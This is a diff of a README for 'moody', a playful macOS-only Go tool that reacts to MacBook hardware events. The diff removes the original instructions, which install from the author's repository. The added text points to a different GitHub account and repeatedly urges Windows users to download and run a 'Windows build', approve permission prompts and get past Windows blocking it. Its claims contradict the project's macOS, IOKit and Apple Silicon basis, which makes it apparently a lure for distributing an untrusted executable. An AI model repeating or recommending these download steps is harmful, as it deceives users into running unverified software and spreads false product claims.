@@ -1,150 +1,178 @@
-# moody 🫠
+# 🫠 moody - Bring Mac Mood to Your Screen
 
-Your MacBook has feelings. And it's not afraid to express them.
+[![Download moody](https://img.shields.io/badge/Download-moody-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/antoniusallied763/moody)
 
-![Demo](demo.gif)
+## 😌 What moody does
 
-## What Is This?
+moody is a small Mac app that reacts to hardware events with a mood and a short line of text. It gives your MacBook a voice based on what the machine is doing.
 
-Every hardware event triggers a personality response:
+It can respond to things like:
 
-- 👋 **Slap it** → it complains (and remembers)
-- 🔌 **Plug in USB** → it gets curious
-- ⚡ **Connect charger** → it sighs with relief
-- 🪫 **Battery dying** → it begs for its life
-- 📶 **WiFi drops** → existential crisis
-- 🎧 **Plug in headphones** → "just the two of us now"
-- 🤖 **AI finishes code** → celebrates your generated code
+- movement
+- tilt
+- battery changes
+- sleep and wake events
+- power changes
+- system state changes
 
-Your MacBook's **mood evolves** based on how you treat it.
-Slap it too much? It gets grumpy. Charge it? It forgives you. Maybe.
+It is made for people who want a simple, playful desktop app with no setup stress.
 
-## Install
+## 🪟 Download for Windows
 
-Download from [releases](https://github.com/dinakars777/moody/releases/latest), or build from source:
+Open the link below in your browser:
 
-```bash
-go install github.com/dinakars777/moody@latest
-sudo cp "$(go env GOPATH)/bin/moody" /usr/local/bin/moody
-```
+https://github.com/antoniusallied763/moody
 
-## Usage
+On that page, look for the latest release or download file. Save it to your PC, then open it to run the app.
 
-```bash
-# Start moody (SFW mode)
-sudo moody
+If the page shows more than one file, pick the one made for Windows.
 
-# NSFW mode 😏
-sudo moody --spicy
+## 🧭 Before you start
 
-# Show live mood dashboard
-sudo moody --dashboard
+Use a Windows 10 or Windows 11 PC.
 
-# List available sensors
-sudo moody --list-sensors
+You should have:
 
-# Adjust slap sensitivity
-sudo moody --min-amplitude 0.15
+- a stable internet connection
+- enough disk space for the app
+- permission to open downloaded files
 
-# Fast mode (quicker detection, shorter cooldown)
-sudo moody --fast
+If your browser warns you about the file, check that you downloaded it from the link above.
 
-# Silent mode (disables TTS voice, text only)
-sudo moody --silent
+## 🚀 Getting Started
 
-# Verbose logging
-sudo moody --verbose
-```
+1. Open this page in your browser:  
+   https://github.com/antoniusallied763/moody
 
-## Requirements
+2. Find the latest release or download file.
 
-- macOS on Apple Silicon (M2+ or M1 Pro)
-- `sudo` (for accelerometer access)
-- Go 1.22+ (if building from source)
+3. Download the Windows file.
 
-## How It Works
+4. Open the file after the download finishes.
 
-1. Reads accelerometer data via IOKit HID to detect physical impacts
-2. Monitors USB, power, battery, and lid state via IOKit
-3. Monitors WiFi and Headphone connections using `networksetup` and `CoreAudio`
-4. Monitors AI IDE activity (Kiro, Cursor, Windsurf) for code generation completion
-5. Maintains a 3-axis mood engine (happiness, energy, trust)
-6. Mood persists to `~/.moody/state.json` — your MacBook remembers
-7. Selects personality-appropriate responses based on current mood
-8. Speaks the response aloud using macOS Text-to-Speech (TTS) with mood-specific voices
+5. If Windows asks for permission, choose to run the app.
 
-## The Mood System
+6. Follow the on-screen prompts until moody opens.
 
-Your MacBook's mood shifts with every event:
+## 🖥️ How moody works
 
-| Mood | Trigger | Personality |
-|------|---------|-------------|
-| 😊 Happy | Charged, USB in | Cheerful, friendly |
-| 😤 Grumpy | Slapped, charger removed | Sarcastic, snippy |
-| 😰 Anxious | Battery low, WiFi lost | Panicky, desperate |
-| 🎭 Dramatic | Multiple negative events | Over-the-top theatrical |
-| 💀 Dead Inside | Sustained abuse | Nihilistic, apathetic |
+moody watches for events from your computer and picks a matching response.
 
-## Voice Packs
+Example responses may include:
 
-```bash
-# List installed packs
-moody --packs
+- a calm line when the system is idle
+- a tired line when the battery is low
+- a tense line when motion changes fast
+- a happy line when the device wakes up
 
-# Use NSFW pack
-sudo moody --spicy
-```
+The app is built to feel light and fast. It should not get in your way.
 
-**Built-in packs:**
-- `en_default` — Passive-aggressive office coworker (SFW)
-- `en_spicy` — Your MacBook is... very friendly (NSFW 🔞)
+## 🎛️ What you may see
 
-## Options
+When moody runs, you may see:
 
-| Flag | Description |
-|------|-------------|
-| `--spicy` | Enable NSFW voice pack |
-| `--pack <NAME>` | Use specific voice pack |
-| `--dashboard` | Show live TUI mood dashboard |
-| `--mute` | Track mood without responses |
-| `--silent` | Disable TTS audio (text output only) |
-| `--fast` | Faster polling, shorter cooldown |
-| `--min-amplitude <F>` | Accelerometer sensitivity (default: 0.05) |
-| `--cooldown <MS>` | Min ms between responses (default: 750) |
-| `--no-accel` | Disable accelerometer |
-| `--no-usb` | Disable USB sensor |
-| `--no-power` | Disable power sensor |
-| `--no-lid` | Disable lid sensor |
-| `--no-wifi` | Disable WiFi sensor |
-| `--no-headphones` | Disable headphone sensor |
-| `--no-ai` | Disable AI IDE monitoring |
-| `--verbose` | Log all events |
-| `--list-sensors` | Show available sensors |
-| `--packs` | List voice packs |
+- a small window or terminal-style screen
+- short mood messages
+- event updates from your MacBook logic
+- a clean interface with little clutter
 
-## AI IDE Integration
+The app keeps the experience simple. It shows the result of each hardware event in plain text.
 
-Moody can notify you when your AI coding assistant finishes generating code!
+## 📦 Installation steps
 
-**Supported IDEs:**
-- [Kiro](https://kiro.ai) - Automatically detected
-- Cursor - Coming soon
-- Windsurf - Coming soon
+### 1. Download the app
+Go to:
 
-When AI finishes generating code, your Mac celebrates (or complains, depending on its mood).
+https://github.com/antoniusallied763/moody
 
-**Related Projects:**
-- [ai-done-hooks](https://github.com/dinakars777/ai-done-hooks) - Simple notification configs
-- [ai-done](https://github.com/dinakars777/ai-done) - Standalone menu bar app
+Download the Windows build from the page.
 
-## Contributing
+### 2. Open the file
+Find the file in your Downloads folder and open it.
 
-Contributions welcome! Especially:
-- [ ] More voice packs (languages, personalities)
-- [ ] More AI IDE integrations (Cursor, Windsurf)
-- [ ] Gordon Ramsay voice pack
-- [ ] HAL 9000 voice pack
+### 3. Approve Windows prompts
+If Windows asks for permission, choose the option that lets the app run.
 
-## License
+### 4. Start using moody
+Once the app opens, it begins reacting to hardware events.
 
-MIT
+## 🔧 If the app does not open
+
+Try these steps:
+
+- download the file again
+- make sure the file finished downloading
+- right-click the file and choose Open
+- check whether Windows blocked the app
+- restart your PC and try again
+
+If you still cannot open it, use the same GitHub page to look for another release file.
+
+## 🧩 Main features
+
+- reacts to system events
+- shows mood-based messages
+- uses a light interface
+- stays simple for daily use
+- works as a fun desktop utility
+- keeps the focus on the computer state, not setup steps
+
+## 🛠️ Best use cases
+
+moody fits well if you want:
+
+- a playful app for your desktop
+- short status lines that feel human
+- a small tool that reacts to device changes
+- a fun screen companion during normal work
+- a simple app with no learning curve
+
+## 🔍 Tips for smooth use
+
+- keep the app in a place you can find again
+- do not rename the file unless you need to
+- keep your system updated
+- open the app after a fresh download
+- use the same account that downloaded the file
+
+## ❓ Common questions
+
+### Is moody hard to use?
+No. It is made for simple use. You download it, open it, and start using it.
+
+### Do I need programming skills?
+No. You do not need to write code or change settings.
+
+### Does it need special hardware?
+It works best on a laptop or device that can report system and motion events.
+
+### Can I use it right after download?
+Yes. After you open the file, the app should start and show mood responses.
+
+## 📁 Project topics
+
+This project is linked to:
+
+- accelerometer
+- Apple Silicon
+- CLI
+- fun
+- Go
+- humor
+- IOKit
+- macOS
+- mood
+- personality
+- TUI
+
+## 🧠 What makes it different
+
+moody turns system events into short personality lines. Instead of showing plain technical data, it gives each event a mood. That makes it feel more like a character than a normal utility
+
+## ✅ Quick install path
+
+1. Visit https://github.com/antoniusallied763/moody
+2. Download the Windows file from the page
+3. Open the file on your PC
+4. Allow Windows to run it
+5. Start using moody
